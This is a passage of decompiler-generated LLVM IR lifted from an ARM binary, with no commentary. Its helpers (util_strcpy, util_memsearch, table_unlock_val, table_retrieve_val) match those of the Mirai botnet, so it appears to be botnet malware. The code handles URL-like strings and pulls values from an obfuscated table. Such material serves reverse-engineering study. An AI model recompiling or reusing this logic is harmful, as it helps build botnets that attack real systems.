  %v0_9ba4 = load i32, i32* @sl, align 4
  %v1_9ba4 = add i32 %v0_9ba4, 660
  %v2_9ba4 = inttoptr i32 %v1_9ba4 to i32*
  %v3_9ba4 = load i32, i32* %v2_9ba4, align 4
  %v0_9ba8 = load i32, i32* @r7, align 4
  %v2_9ba8 = add i32 %v0_9ba8, %v1_9ba0
  store i32 %v2_9ba8, i32* @r6, align 4
  %v2_9bac = sub i32 %v3_9ba4, %v1_9ba0
  store i32 %v2_9bac, i32* %r1.global-to-local, align 4
  %v0_9bb0 = load i32, i32* @r8, align 4
  store i32 %v0_9bb0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7b4.60 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9ba8, i32* %r0.global-to-local, align 4
  %v4_9bbc = call i32 @util_memsearch(i32 %v2_9ba8, i32 %v2_9bac, i32 ptrtoint (i32* @global_var_1a7b4.60 to i32), i32 %v0_9bb0)
  store i32 %v4_9bbc, i32* %r0.global-to-local, align 4
  %v0_9bc0 = load i32, i32* @sl, align 4
  %v1_9bc0 = add i32 %v0_9bc0, 16
  %v2_9bc0 = inttoptr i32 %v1_9bc0 to i32*
  %v3_9bc0 = load i32, i32* %v2_9bc0, align 4
  %v1_9bc4 = and i32 %v3_9bc0, 33554432
  %v2_9bc4 = icmp ne i32 %v1_9bc4, 0
  store i1 %v2_9bc4, i1* %cpsr_c.global-to-local, align 1
  %v3_9bc4 = mul i32 %v3_9bc0, 128
  %v1_9bc8 = add i32 %v3_9bc4, 1472
  %v0_9bcc = load i32, i32* %sb.global-to-local, align 4
  %v1_9bcc = load i32, i32* @r5, align 4
  %v2_9bd0 = add i32 %v1_9bc8, %v0_9bcc
  store i32 %v2_9bd0, i32* @r4, align 4
  %v2_9bcc = add i32 %v0_9bcc, %v4_9bbc
  %v2_9bd4 = add i32 %v2_9bcc, %v1_9bcc
  store i32 %v2_9bd4, i32* @r5, align 4
  %v0_9bd8 = load i32, i32* %fp.global-to-local, align 4
  %v1_9bd8 = trunc i32 %v0_9bd8 to i8
  %v3_9bd8 = add i32 %v2_9bd4, 2115
  %v4_9bd8 = inttoptr i32 %v3_9bd8 to i8*
  store i8 %v1_9bd8, i8* %v4_9bd8, align 1
  %v0_9bdc = load i32, i32* @r4, align 4
  store i32 %v0_9bdc, i32* %r0.global-to-local, align 4
  %v1_9be0 = inttoptr i32 %v0_9bdc to i8*
  %v2_9be0 = call i32 @util_strlen(i8* %v1_9be0)
  %v0_9be4 = load i32, i32* @r6, align 4
  store i32 %v0_9be4, i32* %r1.global-to-local, align 4
  %v0_9be8 = load i32, i32* @r4, align 4
  %v2_9be8 = add i32 %v0_9be8, %v2_9be0
  store i32 %v2_9be8, i32* @r0, align 4
  %v2_9bec = inttoptr i32 %v2_9be8 to i8*
  %v3_9bec = call i32 @util_strcpy(i8* %v2_9bec, i32 %v0_9be4)
  store i32 %v3_9bec, i32* %r0.global-to-local, align 4
  %v0_9bf0 = load i32, i32* @sl, align 4
  %v1_9bf0 = add i32 %v0_9bf0, 16
  %v2_9bf0 = inttoptr i32 %v1_9bf0 to i32*
  %v3_9bf0 = load i32, i32* %v2_9bf0, align 4
  %v1_9bf4 = add i32 %v3_9bf0, 1
  store i32 %v1_9bf4, i32* %r3.global-to-local, align 4
  store i32 %v1_9bf4, i32* %v2_9bf0, align 4
  br label %dec_label_pc_99ec

dec_label_pc_9c00:                                ; preds = %dec_label_pc_9644
  %v0_9c00 = load i32, i32* %sb.global-to-local, align 4
  %v1_9c04 = add i32 %v0_9c00, 533
  store i32 %v1_9c04, i32* @r4, align 4
  store i32 %v1_9c04, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9c10 = call i32 @util_zero(i32 %v1_9c04, i32 255)
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9c18 = load i8*, i8** %stack_var_-44, align 4
  %v4_9c18 = ptrtoint i8* %v3_9c18 to i32
  %v0_9c1c = load i32, i32* @r6, align 4
  %v1_9c1c = add i32 %v0_9c1c, 1
  store i32 %v1_9c1c, i32* @r6, align 4
  %v2_9c20 = add i32 %v1_9c1c, %v4_9c18
  store i32 %v2_9c20, i32* %r0.global-to-local, align 4
  %v1_9c24 = inttoptr i32 %v2_9c20 to i8*
  %v2_9c24 = call i32 @util_strlen(i8* %v1_9c24)
  store i32 %v2_9c24, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9c28 = icmp eq i32 %v2_9c24, 0
  store i1 %v2_9c28, i1* %cpsr_z.global-to-local, align 1
  %tmp213 = icmp slt i32 %v2_9c24, 1
  br i1 %tmp213, label %dec_label_pc_9654, label %dec_label_pc_9c30

dec_label_pc_9c30:                                ; preds = %dec_label_pc_9c00
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9c34 = load i8*, i8** %stack_var_-44, align 4
  %v4_9c34 = ptrtoint i8* %v3_9c34 to i32
  %v0_9c38 = load i32, i32* @r6, align 4
  %v2_9c38 = add i32 %v0_9c38, %v4_9c34
  store i32 %v2_9c38, i32* %r0.global-to-local, align 4
  %v1_9c3c = inttoptr i32 %v2_9c38 to i8*
  %v2_9c3c = call i32 @util_strlen(i8* %v1_9c3c)
  store i32 %v2_9c3c, i32* %r0.global-to-local, align 4
  %v2_9c40 = icmp ugt i32 %v2_9c3c, 254
  store i1 %v2_9c40, i1* %cpsr_c.global-to-local, align 1
  %v7_9c40 = icmp eq i32 %v2_9c3c, 255
  store i1 %v7_9c40, i1* %cpsr_z.global-to-local, align 1
  %v8_9c44 = icmp sgt i32 %v2_9c3c, 255
  br i1 %v8_9c44, label %dec_label_pc_9654, label %dec_label_pc_9c48

dec_label_pc_9c48:                                ; preds = %dec_label_pc_9c30
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  %v3_9c4c = load i8*, i8** %stack_var_-44, align 4
  %v4_9c4c = ptrtoint i8* %v3_9c4c to i32
  %v0_9c50 = load i32, i32* @r4, align 4
  store i32 %v0_9c50, i32* @r0, align 4
  %v0_9c54 = load i32, i32* @r6, align 4
  %v2_9c54 = add i32 %v0_9c54, %v4_9c4c
  store i32 %v2_9c54, i32* %r1.global-to-local, align 4
  %v2_9c58 = inttoptr i32 %v0_9c50 to i8*
  %v3_9c58 = call i32 @util_strcpy(i8* %v2_9c58, i32 %v2_9c54)
  store i32 %v3_9c58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9654

dec_label_pc_9c60:                                ; preds = %dec_label_pc_98e0
  store i32 7, i32* @ip, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-44, align 4
  %v0_9c6c = load i32, i32* @r6, align 4
  %v1_9c6c = add i32 %v0_9c6c, 4
  %v2_9c6c = inttoptr i32 %v1_9c6c to i8*
  %v3_9c6c = load i8, i8* %v2_9c6c, align 1
  %v4_9c6c = zext i8 %v3_9c6c to i32
  store i32 %v4_9c6c, i32* @r3, align 4
  %v2_9c70 = icmp ugt i8 %v3_9c6c, 114
  store i1 %v2_9c70, i1* %cpsr_c.global-to-local, align 1
  %v7_9c70 = icmp eq i8 %v3_9c6c, 115
  store i1 %v7_9c70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c70, label %bb214, label %.thread48

bb214:                                            ; preds = %dec_label_pc_9c60
  store i32 8, i32* @ip, align 4
  store i8* inttoptr (i32 8 to i8*), i8** %stack_var_-44, align 4
  br label %.thread48

.thread48:                                        ; preds = %dec_label_pc_9c60, %bb214
  %v3_9c80 = phi i8* [ inttoptr (i32 7 to i8*), %dec_label_pc_9c60 ], [ inttoptr (i32 8 to i8*), %bb214 ]
  %v4_9c80 = ptrtoint i8* %v3_9c80 to i32
  %v1_9c84 = sub nsw i32 1, %v4_9c80
  %v1_9c88 = load i32, i32* @r7, align 4
  %v2_9c88 = add i32 %v1_9c84, %v1_9c88
  store i32 %v2_9c88, i32* @r2, align 4
  %v2_9c8c = add i32 %v4_9c80, %v0_9c6c
  store i32 %v2_9c8c, i32* @r1, align 4
  store i32 %v0_9c6c, i32* @r0, align 4
  %v3_9c94 = call i32 @memmove(i32 %v0_9c6c, i32 %v2_9c8c, i32 %v2_9c88)
  store i32 %v3_9c94, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i8* null, i8** %stack_var_-44, align 4
  %v0_9ca4 = load i32, i32* @r5, align 4
  %v1_9ca4 = load i32, i32* @r4, align 4
  %v2_9ca4 = add i32 %v1_9ca4, %v0_9ca4
  %v3_9ca4 = inttoptr i32 %v2_9ca4 to i8*
  %v4_9ca4 = load i8, i8* %v3_9ca4, align 1
  %v6_9ca4 = zext i8 %v4_9ca4 to i32
  store i32 %v6_9ca4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_9ca8 = icmp eq i8 %v4_9ca4, 0
  store i1 %v9_9ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9ca8, label %dec_label_pc_9ce8, label %dec_label_pc_9cb0

dec_label_pc_9cb0:                                ; preds = %.thread48
  %v2_9cb0 = icmp ugt i8 %v4_9ca4, 46
  store i1 %v2_9cb0, i1* %cpsr_c.global-to-local, align 1
  %v7_9cb0 = icmp eq i8 %v4_9ca4, 47
  store i1 %v7_9cb0, i1* %cpsr_z.global-to-local, align 1
  %v1_9cb4 = load i32, i32* @r6, align 4
  br i1 %v7_9cb0, label %bb215, label %dec_label_pc_9cbc

bb215:                                            ; preds = %dec_label_pc_9cb0
  store i32 %v1_9cb4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9d68

dec_label_pc_9cbc:                                ; preds = %dec_label_pc_9cb0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9ccc

dec_label_pc_9cc4:                                ; preds = %dec_label_pc_9ccc
  %v2_9cc4 = icmp ugt i8 %v4_9cd8, 46
  store i1 %v2_9cc4, i1* %cpsr_c.global-to-local, align 1
  %v7_9cc4 = icmp eq i8 %v4_9cd8, 47
  store i1 %v7_9cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9cc4, label %dec_label_pc_9d68, label %dec_label_pc_9ccc

dec_label_pc_9ccc:                                ; preds = %dec_label_pc_9cc4, %dec_label_pc_9cbc
  %v0_9ccc = phi i32 [ %v1_9ccc, %dec_label_pc_9cc4 ], [ 0, %dec_label_pc_9cbc ]
  %v1_9ccc = add i32 %v0_9ccc, 1
  store i32 %v1_9ccc, i32* %r1.global-to-local, align 4
  store i32 %v10_82f0, i32* @ip, align 4
  %v5_9cd4 = inttoptr i32 %v1_9ccc to i8*
  store i8* %v5_9cd4, i8** %stack_var_-44, align 4
  %v2_9cd8 = add i32 %v1_9ccc, %v1_9cb4
  %v3_9cd8 = inttoptr i32 %v2_9cd8 to i8*
  %v4_9cd8 = load i8, i8* %v3_9cd8, align 1
  %v6_9cd8 = zext i8 %v4_9cd8 to i32
  store i32 %v6_9cd8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9cdc = icmp eq i8 %v4_9cd8, 0
  store i1 %v2_9cdc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9cd8, i32* %r2.global-to-local, align 4
  br i1 %v2_9cdc, label %dec_label_pc_9ce8, label %dec_label_pc_9cc4

dec_label_pc_9ce8:                                ; preds = %dec_label_pc_9ccc, %.thread48, %dec_label_pc_9d68
  %v0_9ce8 = load i32, i32* @r6, align 4
  store i32 %v0_9ce8, i32* %r0.global-to-local, align 4
  %v1_9cec = inttoptr i32 %v0_9ce8 to i8*
  %v2_9cec = call i32 @util_strlen(i8* %v1_9cec)
  store i32 %v2_9cec, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9cf0 = icmp eq i32 %v2_9cec, 0
  store i1 %v2_9cf0, i1* %cpsr_z.global-to-local, align 1
  %tmp216 = icmp slt i32 %v2_9cec, 1
  br i1 %tmp216, label %dec_label_pc_9d08, label %dec_label_pc_9cf8

dec_label_pc_9cf8:                                ; preds = %dec_label_pc_9ce8
  %v0_9cf8 = load i32, i32* @r6, align 4
  store i32 %v0_9cf8, i32* %r0.global-to-local, align 4
  %v1_9cfc = inttoptr i32 %v0_9cf8 to i8*
  %v2_9cfc = call i32 @util_strlen(i8* %v1_9cfc)
  store i32 %v2_9cfc, i32* %r0.global-to-local, align 4
  %v2_9d00 = icmp ugt i32 %v2_9cfc, 126
  store i1 %v2_9d00, i1* %cpsr_c.global-to-local, align 1
  %v7_9d00 = icmp eq i32 %v2_9cfc, 127
  store i1 %v7_9d00, i1* %cpsr_z.global-to-local, align 1
  %v7_9d04 = icmp slt i32 %v2_9cfc, 128
  br i1 %v7_9d04, label %dec_label_pc_9ec8, label %dec_label_pc_9d08

dec_label_pc_9d08:                                ; preds = %dec_label_pc_9cf8, %dec_label_pc_9ce8, %dec_label_pc_9ec8
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9d0c = load i8*, i8** %stack_var_-44, align 4
  %v4_9d0c = ptrtoint i8* %v3_9d0c to i32
  %v0_9d10 = load i32, i32* @r6, align 4
  %v1_9d10 = add i32 %v0_9d10, 1
  store i32 %v1_9d10, i32* @r5, align 4
  %v2_9d14 = add i32 %v1_9d10, %v4_9d0c
  store i32 %v2_9d14, i32* %r0.global-to-local, align 4
  %v1_9d18 = inttoptr i32 %v2_9d14 to i8*
  %v2_9d18 = call i32 @util_strlen(i8* %v1_9d18)
  store i32 %v2_9d18, i32* %r0.global-to-local, align 4
  %v2_9d1c = icmp ugt i32 %v2_9d18, 254
  store i1 %v2_9d1c, i1* %cpsr_c.global-to-local, align 1
  %v7_9d1c = icmp eq i32 %v2_9d18, 255
  store i1 %v7_9d1c, i1* %cpsr_z.global-to-local, align 1
  %v8_9d20 = icmp sgt i32 %v2_9d18, 255
  br i1 %v8_9d20, label %dec_label_pc_9918, label %dec_label_pc_9d24

dec_label_pc_9d24:                                ; preds = %dec_label_pc_9d08
  %v0_9d24 = load i32, i32* %sb.global-to-local, align 4
  %v1_9d28 = add i32 %v0_9d24, 533
  store i32 %v1_9d28, i32* @r4, align 4
  store i32 %v1_9d28, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9d34 = call i32 @util_zero(i32 %v1_9d28, i32 255)
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9d3c = load i8*, i8** %stack_var_-44, align 4
  %v4_9d3c = ptrtoint i8* %v3_9d3c to i32
  %v0_9d40 = load i32, i32* @r5, align 4
  %v2_9d40 = add i32 %v0_9d40, %v4_9d3c
  store i32 %v2_9d40, i32* %r0.global-to-local, align 4
  %v1_9d44 = inttoptr i32 %v2_9d40 to i8*
  %v2_9d44 = call i32 @util_strlen(i8* %v1_9d44)
  store i32 %v2_9d44, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9d48 = icmp eq i32 %v2_9d44, 0
  store i1 %v2_9d48, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v2_9d44, 1
  br i1 %tmp217, label %dec_label_pc_9918, label %dec_label_pc_9d50

dec_label_pc_9d50:                                ; preds = %dec_label_pc_9d24
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9d54 = load i8*, i8** %stack_var_-44, align 4
  %v4_9d54 = ptrtoint i8* %v3_9d54 to i32
  %v0_9d58 = load i32, i32* @r4, align 4
  store i32 %v0_9d58, i32* @r0, align 4
  %v0_9d5c = load i32, i32* @r5, align 4
  %v2_9d5c = add i32 %v0_9d5c, %v4_9d54
  store i32 %v2_9d5c, i32* %r1.global-to-local, align 4
  %v2_9d60 = inttoptr i32 %v0_9d58 to i8*
  %v3_9d60 = call i32 @util_strcpy(i8* %v2_9d60, i32 %v2_9d5c)
  store i32 %v3_9d60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9918

dec_label_pc_9d68:                                ; preds = %dec_label_pc_9cc4, %bb215
  %v2_9d6c = phi i32 [ %v1_9cb4, %bb215 ], [ %v2_9cd8, %dec_label_pc_9cc4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9d6c = inttoptr i32 %v2_9d6c to i8*
  store i8 0, i8* %v3_9d6c, align 1
  br label %dec_label_pc_9ce8

dec_label_pc_9d74:                                ; preds = %dec_label_pc_9898
  %v1_9d74 = add i32 %v0_9d74, 1
  store i32 %v1_9d74, i32* %ip.global-to-local, align 4
  %v2_9d78 = add i32 %v0_9898, %v1_9d74
  store i32 %v2_9d78, i32* %r4.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 %v2_9d78, i32* %r0.global-to-local, align 4
  %v5_9d84 = inttoptr i32 %v1_9d74 to i8*
  store i8* %v5_9d84, i8** %stack_var_-44, align 4
  %v1_9d88 = inttoptr i32 %v2_9d78 to i8*
  %v2_9d88 = call i32 @util_strlen(i8* %v1_9d88)
  store i32 %v2_9d88, i32* %r0.global-to-local, align 4
  %v0_9d8c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d8c = add i32 %v0_9d8c, %v2_9d88
  %v1_9d90 = add i32 %v2_9d8c, -1
  %v2_9d90 = inttoptr i32 %v1_9d90 to i8*
  %v3_9d90 = load i8, i8* %v2_9d90, align 1
  %v4_9d90 = zext i8 %v3_9d90 to i32
  store i32 %v4_9d90, i32* %r3.global-to-local, align 4
  %v2_9d94 = icmp ugt i8 %v3_9d90, 33
  store i1 %v2_9d94, i1* %cpsr_c.global-to-local, align 1
  %v7_9d94 = icmp eq i8 %v3_9d90, 34
  store i1 %v7_9d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9d94, label %dec_label_pc_9d9c, label %dec_label_pc_98a4

dec_label_pc_9d9c:                                ; preds = %dec_label_pc_9d74
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9da0 = load i8*, i8** %stack_var_-44, align 4
  %v4_9da0 = ptrtoint i8* %v3_9da0 to i32
  %v0_9da4 = load i32, i32* @r5, align 4
  %v2_9da4 = add i32 %v0_9da4, %v4_9da0
  store i32 %v2_9da4, i32* %r4.global-to-local, align 4
  store i32 %v2_9da4, i32* %r0.global-to-local, align 4
  %v1_9dac = inttoptr i32 %v2_9da4 to i8*
  %v2_9dac = call i32 @util_strlen(i8* %v1_9dac)
  store i32 %v2_9dac, i32* %r0.global-to-local, align 4
  %v2_9db0 = add i32 %v2_9da4, %v2_9dac
  %v0_9db4 = load i32, i32* @r6, align 4
  %v1_9db4 = trunc i32 %v0_9db4 to i8
  %v3_9db4 = add i32 %v2_9db0, -1
  %v4_9db4 = inttoptr i32 %v3_9db4 to i8*
  store i8 %v1_9db4, i8* %v4_9db4, align 1
  br label %dec_label_pc_98a4

dec_label_pc_9dbc:                                ; preds = %dec_label_pc_990c
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9dc0 = load i8*, i8** %stack_var_-44, align 4
  %v4_9dc0 = ptrtoint i8* %v3_9dc0 to i32
  %v0_9dc4 = load i32, i32* @r6, align 4
  %v1_9dc4 = add i32 %v0_9dc4, 1
  store i32 %v1_9dc4, i32* @r5, align 4
  %v2_9dc8 = add i32 %v1_9dc4, %v4_9dc0
  store i32 %v2_9dc8, i32* %r0.global-to-local, align 4
  %v1_9dcc = inttoptr i32 %v2_9dc8 to i8*
  %v2_9dcc = call i32 @util_strlen(i8* %v1_9dcc)
  store i32 %v2_9dcc, i32* %r0.global-to-local, align 4
  %v2_9dd0 = icmp ugt i32 %v2_9dcc, 254
  store i1 %v2_9dd0, i1* %cpsr_c.global-to-local, align 1
  %v7_9dd0 = icmp eq i32 %v2_9dcc, 255
  store i1 %v7_9dd0, i1* %cpsr_z.global-to-local, align 1
  %v8_9dd4 = icmp sgt i32 %v2_9dcc, 255
  br i1 %v8_9dd4, label %dec_label_pc_9918, label %dec_label_pc_9dd8

dec_label_pc_9dd8:                                ; preds = %dec_label_pc_9dbc
  %v0_9dd8 = load i32, i32* %sb.global-to-local, align 4
  %v1_9ddc = add i32 %v0_9dd8, 533
  store i32 %v1_9ddc, i32* @r4, align 4
  store i32 %v1_9ddc, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9de8 = call i32 @util_zero(i32 %v1_9ddc, i32 255)
  store i32 %v10_82f0, i32* @ip, align 4
  %v3_9df0 = load i8*, i8** %stack_var_-44, align 4
  %v4_9df0 = ptrtoint i8* %v3_9df0 to i32
  %v0_9df4 = load i32, i32* @r5, align 4
  %v2_9df4 = add i32 %v0_9df4, %v4_9df0
  store i32 %v2_9df4, i32* %r0.global-to-local, align 4
  %v1_9df8 = inttoptr i32 %v2_9df4 to i8*
  %v2_9df8 = call i32 @util_strlen(i8* %v1_9df8)
  store i32 %v2_9df8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9dfc = icmp eq i32 %v2_9df8, 0
  store i1 %v2_9dfc, i1* %cpsr_z.global-to-local, align 1
  %tmp218 = icmp slt i32 %v2_9df8, 1
  br i1 %tmp218, label %dec_label_pc_9918, label %dec_label_pc_9e04

dec_label_pc_9e04:                                ; preds = %dec_label_pc_9dd8
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9e08 = load i8*, i8** %stack_var_-44, align 4
  %v4_9e08 = ptrtoint i8* %v3_9e08 to i32
  %v0_9e0c = load i32, i32* @r4, align 4
  store i32 %v0_9e0c, i32* @r0, align 4
  %v0_9e10 = load i32, i32* @r5, align 4
  %v2_9e10 = add i32 %v0_9e10, %v4_9e08
  store i32 %v2_9e10, i32* %r1.global-to-local, align 4
  %v2_9e14 = inttoptr i32 %v0_9e0c to i8*
  %v3_9e14 = call i32 @util_strcpy(i8* %v2_9e14, i32 %v2_9e10)
  store i32 %v3_9e14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9918

dec_label_pc_9e1c:                                ; preds = %dec_label_pc_84c0
  store i32 57, i32* %r0.global-to-local, align 4
  %v1_9e20 = call i32 @table_unlock_val(i32 57)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 57, i32* %r0.global-to-local, align 4
  %v3_9e2c = call i32 @table_retrieve_val(i32 57, i32* null)
  store i32 %v3_9e2c, i32* %r1.global-to-local, align 4
  %v0_9e34 = load i32, i32* @r5, align 4
  %v1_9e34 = add i32 %v0_9e34, 20
  store i32 %v1_9e34, i32* @r0, align 4
  %v2_9e38 = inttoptr i32 %v1_9e34 to i8*
  %v3_9e38 = call i32 @util_strcpy(i8* %v2_9e38, i32 %v3_9e2c)
  store i32 57, i32* %r0.global-to-local, align 4
  %v1_9e40 = call i32 @table_lock_val(i32 57)
  store i32 %v1_9e40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9e44:                                ; preds = %dec_label_pc_84c0, %dec_label_pc_9f34, %dec_label_pc_9f08, %dec_label_pc_9edc, %dec_label_pc_9e9c, %dec_label_pc_9e1c
  store i32 %v0_840c, i32* @r0, align 4
  %v0_9e48 = load i32, i32* @r8, align 4
  store i32 %v0_9e48, i32* %r1.global-to-local, align 4
  %v2_9e4c = inttoptr i32 %v0_840c to i8*
  %v3_9e4c = call i32 @util_strcpy(i8* %v2_9e4c, i32 %v0_9e48)
  store i32 %v3_9e4c, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_9e54 = load i32, i32* %fp.global-to-local, align 4
  %v1_9e54 = add i32 %v0_9e54, 1
  store i32 %v1_9e54, i32* %fp.global-to-local, align 4
  %v0_9e58 = load i32, i32* @r5, align 4
  %v3_9e5c = icmp uge i32 %v1_9e54, %v0_839c
  store i1 %v3_9e5c, i1* %cpsr_c.global-to-local, align 1
  %v9_9e5c = icmp eq i32 %v1_9e54, %v0_839c
  store i1 %v9_9e5c, i1* %cpsr_z.global-to-local, align 1
  %v1_9e60 = add i32 %v0_9e58, 3140
  store i32 %v1_9e60, i32* @r5, align 4
  br i1 %v9_9e5c, label %dec_label_pc_9e68, label %dec_label_pc_83cc

dec_label_pc_9e68:                                ; preds = %dec_label_pc_9e44
  %v0_9e78 = load i32, i32* @r7, align 4
  %v1_9e78 = and i32 %v0_9e78, 128
  %v2_9e78 = icmp ne i32 %v1_9e78, 0
  store i1 %v2_9e78, i1* %cpsr_c.global-to-local, align 1
  %v3_9e78 = udiv i32 %v0_9e78, 256
  %v1_9e7c = add i32 %v2_83b0, 1452
  store i32 %v1_9e7c, i32* %r3.global-to-local, align 4
  %v2_9e80 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_9e80, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_852c.preheader

dec_label_pc_9e9c:                                ; preds = %dec_label_pc_84c0
  store i32 58, i32* %r0.global-to-local, align 4
  %v1_9ea0 = call i32 @table_unlock_val(i32 58)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 58, i32* %r0.global-to-local, align 4
  %v3_9eac = call i32 @table_retrieve_val(i32 58, i32* null)
  store i32 %v3_9eac, i32* %r1.global-to-local, align 4
  %v0_9eb4 = load i32, i32* @r5, align 4
  %v1_9eb4 = add i32 %v0_9eb4, 20
  store i32 %v1_9eb4, i32* @r0, align 4
  %v2_9eb8 = inttoptr i32 %v1_9eb4 to i8*
  %v3_9eb8 = call i32 @util_strcpy(i8* %v2_9eb8, i32 %v3_9eac)
  store i32 58, i32* %r0.global-to-local, align 4
  %v1_9ec0 = call i32 @table_lock_val(i32 58)
  store i32 %v1_9ec0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9ec8:                                ; preds = %dec_label_pc_9cf8
  %v0_9ec8 = load i32, i32* %sb.global-to-local, align 4
  %v0_9ecc = load i32, i32* @r6, align 4
  store i32 %v0_9ecc, i32* %r1.global-to-local, align 4
  %v1_9ed0 = add i32 %v0_9ec8, 789
  store i32 %v1_9ed0, i32* @r0, align 4
  %v2_9ed4 = inttoptr i32 %v1_9ed0 to i8*
  %v3_9ed4 = call i32 @util_strcpy(i8* %v2_9ed4, i32 %v0_9ecc)
  store i32 %v3_9ed4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9d08

dec_label_pc_9edc:                                ; preds = %dec_label_pc_84c0
  store i32 55, i32* %r0.global-to-local, align 4
  %v1_9ee0 = call i32 @table_unlock_val(i32 55)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 55, i32* %r0.global-to-local, align 4
  %v3_9eec = call i32 @table_retrieve_val(i32 55, i32* null)
  store i32 %v3_9eec, i32* %r1.global-to-local, align 4
  %v0_9ef4 = load i32, i32* @r5, align 4
  %v1_9ef4 = add i32 %v0_9ef4, 20
  store i32 %v1_9ef4, i32* @r0, align 4
  %v2_9ef8 = inttoptr i32 %v1_9ef4 to i8*
  %v3_9ef8 = call i32 @util_strcpy(i8* %v2_9ef8, i32 %v3_9eec)
  store i32 55, i32* %r0.global-to-local, align 4
  %v1_9f00 = call i32 @table_lock_val(i32 55)
  store i32 %v1_9f00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9f08:                                ; preds = %dec_label_pc_84c0
  store i32 54, i32* %r0.global-to-local, align 4
  %v1_9f0c = call i32 @table_unlock_val(i32 54)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 54, i32* %r0.global-to-local, align 4
  %v3_9f18 = call i32 @table_retrieve_val(i32 54, i32* null)
  store i32 %v3_9f18, i32* %r1.global-to-local, align 4
  %v0_9f20 = load i32, i32* @r5, align 4
  %v1_9f20 = add i32 %v0_9f20, 20
  store i32 %v1_9f20, i32* @r0, align 4
  %v2_9f24 = inttoptr i32 %v1_9f20 to i8*
  %v3_9f24 = call i32 @util_strcpy(i8* %v2_9f24, i32 %v3_9f18)
  store i32 54, i32* %r0.global-to-local, align 4
  %v1_9f2c = call i32 @table_lock_val(i32 54)
  store i32 %v1_9f2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9f34:                                ; preds = %dec_label_pc_84c0
  store i32 56, i32* %r0.global-to-local, align 4
  %v1_9f38 = call i32 @table_unlock_val(i32 56)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r0.global-to-local, align 4
  %v3_9f44 = call i32 @table_retrieve_val(i32 56, i32* null)
  store i32 %v3_9f44, i32* %r1.global-to-local, align 4
  %v0_9f4c = load i32, i32* @r5, align 4
  %v1_9f4c = add i32 %v0_9f4c, 20
  store i32 %v1_9f4c, i32* @r0, align 4
  %v2_9f50 = inttoptr i32 %v1_9f4c to i8*
  %v3_9f50 = call i32 @util_strcpy(i8* %v2_9f50, i32 %v3_9f44)
  store i32 56, i32* %r0.global-to-local, align 4
  %v1_9f58 = call i32 @table_lock_val(i32 56)
  store i32 %v1_9f58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

; uselistorder directives
  uselistorder i32 %v2_9e80, { 1, 0 }
  uselistorder i32 %v1_9e7c, { 1, 0 }
  uselistorder i32 %v0_9e78, { 0, 2, 1 }
  uselistorder i32 %v1_9e60, { 1, 0 }
  uselistorder i32 %v1_9d74, { 1, 0, 2 }
  uselistorder i8 %v4_9cd8, { 2, 3, 1, 0 }
  uselistorder i32 %v1_9ccc, { 0, 2, 3, 1 }
  uselistorder i1 %v7_9cc4, { 1, 0 }
  uselistorder i32 %v1_9cb4, { 1, 0, 2 }
  uselistorder i1 %v7_9cb0, { 1, 0 }
  uselistorder i1 %v9_9ca8, { 1, 0 }
